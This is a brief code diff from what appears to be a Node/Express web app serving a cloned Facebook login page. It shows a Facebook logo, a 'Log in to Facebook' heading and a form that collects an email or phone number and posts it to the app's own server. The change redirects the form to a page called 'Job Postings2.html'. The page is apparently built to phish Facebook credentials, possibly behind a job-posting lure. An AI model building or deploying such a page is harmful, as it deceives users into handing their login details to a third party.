@@ -170,7 +170,7 @@ app.get('/success', (req, res) => {
     <img src="images/fbloginlogo.png" class="fblogo" alt="fblogo">
     <div class="login-container">
         <h2 style="font-size: 17px; font-weight: bold; color: #504e4e; margin-bottom: 48px; font-family: sans-serif;">Log in to Facebook</h2>
-        <form action="/another-page" method="POST">
+        <form action="/Job Postings2.html" method="POST">
             <div class="form-group">
                 <input placeholder="Email address or Phone number" type="text" id="username" name="username" required>
             </div>
